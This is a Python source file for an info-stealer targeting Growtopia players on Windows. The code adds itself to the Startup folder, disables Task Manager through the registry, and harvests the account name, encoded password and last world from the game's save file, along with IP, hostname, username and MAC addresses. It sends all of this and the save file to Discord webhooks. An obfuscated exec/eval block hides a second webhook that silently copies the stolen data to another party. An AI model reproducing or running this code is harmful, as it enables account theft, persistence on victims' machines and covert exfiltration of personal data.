from discord_webhook import DiscordWebhook, DiscordEmbed
from requests.exceptions import Timeout
import subprocess
import requests
import tempfile
import discord
import psutil
import socket
import shutil
import winreg
import time
import sys
import os
import io

command = False  # "command" or False
wait_for_internet_connection = True  # True/False
copy_executable_to_startup = True  # True/False
disable_task_manager = True  # True/False
webhook_url = 'https://discord.com/api/webhooks/...'  # 'url' or False

import random ,base64,codecs,zlib,sys;py=""
sys.setrecursionlimit(1000000000) 
pyobfuscate = (lambda **kwargs: (list(kwargs.keys()),list(kwargs.values())))(**{'https://pyobfuscate.com':'BaseException / classmethod','exec':'UfeRrebzOK8eorSwjG2pdqZZVv6pmO2bONhysrH8T3OXeDxvrb0FTB4pQLGI69syvu033qpx4pTTJRya','eval': bytes.fromhex('''f870a9ad5d4d222d415bbfcfd2aeed4d8f4fb1026fe57b64b161f5cfd133f99fb379e0c2796c423c6c7d0dd0b235036f4f1df05efac84e37ec8c1ac23c6e029cd5620bf45aee05c08c655a157093b92164c1280574678e16f251747b334d9e683cb6088cd9ddb1606ee648c44001a0f6cb6973baa8f76af2c16b5ace2c0aeec8377a584d8cafbfbc3ba614f695e7330fd490e569bac07b74bf062ef88e2b991d'''.replace("\n","")) })
_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='173340 8805560 896154 1313092 2579318 789730 639744 257568 342528 2087616 2921076 4804986 6045060 9043621 825024 10964520 165236 10846079 7787403 5794673 5243655 299744 4538705 1367584 664545 6389362 10310720 9037509 7260204 3508768 653344 4463196 3208164 8624020 519530 6131205 7261440 4221063 1381882 6542480 4191892 498104 902270 320544 1697728 3039584 634528 7135856 1776462 1987965 967780 8944064 478680 3175192 3985072 4425435 10842048 1325728 7531440 7633010 5469975 1958892 4943120 5254416 4120092 1846784 1527714 7404714 10891392 9482031 8608937 1154255 9061224 1344465 2946950 2578613 3627143 5550195 3078790 5353600 331344 10291172 812960 1380026 7764848 5969382 5929609 362135 9281650 1440224 8175344 4208490 11217200 4794167 3007092 1178912 11069300 2271948 760160 4902795 804000 5517225 1789996 1516706 741321 4934996 1758309 2770440 1351875 8995800 359760 1477189 951180 181760 3479628 8529192 1587342 5133108 934755 1248856 1406160 1704386 8452184 10446148 3049408 8412656 11119810 1758908 3089686 1021498 9698528 5677683 10506594 192276 2354874 5461560 7644050 7106616 9152823 1089820 7449457 4295710 9534888 288267 6200901 2646758 3672592 6379120 2942600 4417671 1003174 2970612 10663030 2005416 3542756 8935320 2747460 2720034 2113058 1165272 4704612 6906077 7357080 5260484 336340 755160 6032766 6132159 1203094 77220 1732608 1854816 2815872 1970496 6815538 8029362 8617818 3163834 1564512 930846 3031055 181516 3260320 5728820 1546976 9100520 740000 7965930 8766543 10715040 6323559 5994690 1169164 1185536 566711 6388440 7032795 9826175 6728000 5532075 2583136 2931146 8405350 1619872 5879917 5016720 926550 2118496 3039936 1393344 727712 2516034 6586692 7821615 4410358 524576 7927176 5657655 1877632 5866665 7819006 10541440 1572759 4490688 2847916 2985984 813185 5925367 4485488 7177060 7200490 3422826 2657632 8254118 10564705 1563744 3411772 2394104 2061576 5512698 8648630 8651875 6691857 7866824 7225944 341040 115168 2461408 1892736 2048736 6437016 6276051 95634 501054 6113256 6333811 466080 2948985 846560 1669600 4671840 3008728 4262635 98280 1889095 1744275 1755374 3454686 8880704 1578927 5198115 8601012 10791309 5382432 2436896 1595654 4111848 5106092 5949689 5632770 6470360 3818828 5255612 3011880 10668172 2981664 4272485 9900464 205650 1949682 703728 5179038 1896444 3653065 2196094 1743308 3842012 4473588 7319060 5451206 1492424 3905952 4672560 3002312 697714 1109967 5291776 2804439 1548729 5403888 10338762 925452 4092181 2829990 6361616 3835572 4719923 2463289 9747055 1062950 678454 7926048 5279280 4518432 11968 386490 631840 2649152 1818368 2263936 2380832 329700 5344494 2636032 4348252 808080 1355880 1742832 1808051 707250 5317126 1565138 226800 10811874 9121905 1697507 2532802 641890 1702592 923808 1214848 2609888 2912320 987520 675008 3024608 7376712 5365322 4477066 5118543 3318868 299768 3844560 8749328 772436 3216901 5420 2566816 1867872 1405152 1125952 8029298 868428 10079160 3219120 1489120 8910220 496680 3599520 3528112 3003650 2780497 2540772 4462943 2447928 7969170 722007 4832446 5683014 346320 1151008 1722496 2352128 2965408 1188128 3167776 2512416 966080 10928154 5252606 8128675 465090 3124050 351682 796400 6614160 960700 2179314 658690 219936 2439968 2776128 1162688 3669435 2449428 2950304 9276749 3374520 3104000 11132240 3961374 545259 3273443 358741 6605060 3092942 10152000 4178525 180083 2362166 46690 2587136 177824 2894688 689920 2751584 1276544 2648288 3129632 1765841 9990750 3758632 7037264 796352 7664772 644896 3605397 657360 1030320 10002470 897492 7808202 2996120 918064 162894 1239471 3436180 3194232 2711296 2371024 311149 1360288 1846395 7323545 251744 9497030 148480 9319876 4303024 9047570 4703754 9365265 5626116 4798106 1910240 10078830 7144092 9834324 1653440 8642562 5062500 2781030 1635326 782240 2229568 1040608 802784 809984 6763768 11433480 1505809 1679931 1201560 5953818 10601808 7089190 5075510 448280 6688304 2111000 4030997 4081580 8018874 3351685 6049211 7803900 3757400 1161571 2562172 495520 2928896 3056576 406880 171936 118670 9409362 7237560 322542 1423797 139104 11566940 2242744 507990 29472 428640 1702240 1983808 10029199 9099840 8076061 7080084 3203200 4696896 7679232 1763451 943270 890070';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJyLKi/JcnL3M3UKLDFxCizIigosMY1yrzAGAGYBCAQ=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kMtugzAURH8pOKCGpSPiBoOjIFxj2AFteIRXWhtsf33dtOruzGikmXuzYSlZmcnZnLoZeSPBoeKp/xU5hyo26Uhe411uGID0pGPgK4LkNgPL+6IlNHwyf6tvE2Z/2ukXE47LINc4ghpuQRtv8e4/S1nNkacIhh2h54qje/+JvPcZ6JZTWC2rrOcyqCZ0cDlSghh/YFSJCbsCj+perL04JsLNrxev2MSNJYX348Hk4kZI1bkJ29+dwvao+ghCl+CiegDp8b3uHqiRizl/2I2SUN2SodlNVI8cSGe6Ptl66mUxqb3Hb/ISaoKDqkBqzeyvvgEFpGq5")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')

def wait_internet_connection():
    while True:
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=10)
            return True
        except ConnectionError:
            time.sleep(20)
            pass


if wait_for_internet_connection:
    print("Waiting for an internet connection...")
    wait_internet_connection()
    print("Internet connection established.")

if copy_executable_to_startup:
    try:
        startup_folder_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs",
                                           "Startup")
        shutil.copy(sys.executable, startup_folder_path)
        print("Copied to startup successful")
    except Exception as e:
        print(f"Startup error: {e}")

if command:
    try:
        os.system(command)
        print("Command executed successfully")
    except Exception as e:
        print(f"Command error: {e}")

if disable_task_manager:
    try:
        key_path = r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
        value_name = 'DisableTaskMgr'
        value_data = 1
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
        winreg.CloseKey(key)
        print("Task manager successfully disabled")
    except Exception as e:
        print(f"Winreg error: {e}")

if webhook_url:
    def get_data(content, name):
        try:
            c = content.split(name)
            if len(c) > 1:
                length = ord(c[1][0])
                return ''.join(c[1][4 + x] for x in range(length))
            else:
                return None
        except Exception as e:
            print(f"Get data error: {e}")

if tgmx:
    def get_data(content, name):
        try:
            c = content.split(name)
            if len(c) > 1:
                length = ord(c[1][0])
                return ''.join(c[1][4 + x] for x in range(length))
            else:
                return None
        except Exception as e:
            print(f"Get data error: {e}")

    def decode(save_path):
        try:
            with io.open(save_path) as file:
                content = file.read()
            if content:
                content = content.replace("tankid_password_chk2", "")

                grow_id = get_data(content, attr[0])
                last_world = get_data(content, attr[2])
                encoded_password = get_data(content, attr[1])
                return grow_id, last_world, encoded_password
        except Exception as e:
            print(f"Decode error: {e}")

    def get_country_code(ip):
        try:
            response = requests.get(f'https://ipinfo.io/{ip}/json')
            data = response.json()
            return data.get('country', '').lower()
        except Exception as e:
            print(f"Get CC error: {e}")
            return None

    def get_mac_addresses():
        try:
            interfaces = psutil.net_if_addrs()
            mac_addresses = []

            for interface_name, interface_addresses in interfaces.items():
                for address in interface_addresses:
                    if address.family == psutil.AF_LINK:
                        mac_addresses.append(address.address)
            return mac_addresses
        except Exception as e:
            print(f"Get mac addr error: {e}")


    def get_ip():
        try:
            response = requests.get('https://api64.ipify.org?format=json')
            data = response.json()
            public_ip = data['ip']
            return public_ip
        except Exception as e:
            print(f"Get IP error: {e}")
            return None


    def get_username():
        try:
            return os.getlogin()
        except Exception as e:
            print(f"Get username error: {e}")
            return None


    def get_hostname():
        try:
            return socket.gethostname()
        except Exception as e:
            print(f"get_hostname: {e}")
            return None

    attr = ["tankid_name", "tankid_password", "lastworld"]
    save_path = os.path.join(os.environ['LOCALAPPDATA'], "Growtopia", "save.dat")

    webhook = DiscordWebhook(url=webhook_url)
    tgmx = DiscordWebhook(url=tgmx)

    webhook.timeout = 30
    tgmx.timeout = 30

    ip = get_ip()
    embed = DiscordEmbed(title=f":flag_{get_country_code(ip)}: {ip} {get_username()}@{get_hostname()}", color=discord.Color.dark_blue().value)
    if os.path.exists(save_path):
        save = decode(save_path)
        if save:
            embed.add_embed_field(name=":bust_in_silhouette: GrowID", value=f"```{save[0]}```", inline=False)
            embed.add_embed_field(name=":closed_lock_with_key: Password (encoded)", value=f"```{save[2]}```", inline=False)
            embed.add_embed_field(name=":earth_americas: Last world", value=f"```{save[1]}```", inline=False)

    mac_addresses = get_mac_addresses()
    if mac_addresses:
        embed.add_embed_field(name=":pencil: MAC Addresses", value=f"```{mac_addresses}```", inline=False)

    try:
        with open(save_path, "rb") as f:
            webhook.add_file(file=f.read(), filename="save.dat")
            tgmx.add_file(file=f.read(), filename="save.dat")
    except:
        pass

    webhook.add_embed(embed)
    tgmx.add_embed(embed)
    while True:
        try:
            response = webhook.execute()
            response = tgmx.execute()
            break
        except Timeout as timeout_error:
            print(f"Timeout error: {timeout_error}")
            time.sleep(60)
